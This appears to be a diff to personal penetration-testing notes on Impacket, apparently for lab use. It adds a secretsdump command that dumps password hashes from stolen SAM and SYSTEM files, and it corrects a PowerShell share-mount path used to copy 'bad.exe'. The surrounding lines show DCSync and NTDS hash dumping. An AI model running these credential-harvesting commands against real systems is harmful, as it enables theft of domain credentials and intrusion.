@@ -4,6 +4,7 @@ WARNING impacket does not handle NTFS well - [Ippsec Blackfield HTB](https://www
 
 From [Impacket Github](https://github.com/SecureAuthCorp/impacket)
 *"Impacket is a collection of Python classes for working with network protocols."*
+
 ## What protocols are featured?
 -   Ethernet, Linux "Cooked" capture.
 -   IP, TCP, UDP, ICMP, IGMP, ARP.
@@ -122,6 +123,11 @@ Exploit DCSync Privileges
 secretsdump.py -dc-ip $IP $domain/$user@$ip
 ```
 
+Dump hashes from SAM database [[AD-Credential-Harvesting]]
+```bash
+secretsdump.py -sam $exfiled_sam -system $exfiled_system LOCAL
+```
+
 Dump a NTDS hashes
 ```bash
 impacket-secretsdump -system system -security security LOCAL
@@ -150,13 +156,13 @@ On remote:
 ```powershell
 $pass = convertto-securestring 'pass' -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential('user', $pass)
-New-PSDrive -Name user -PSProvider FileSystem -Credential $cred -Root \\$IP
+New-PSDrive -Name user -PSProvider FileSystem -Credential $cred -Root \\$IP\$sharename
 ```
 
 ```powershell
 copy \\$ip\$Sharename\bad.exe
 # Move into Share
-cd $Share:
+cd $Share: # cd Share:
 ```
 
 ## ticketer.py
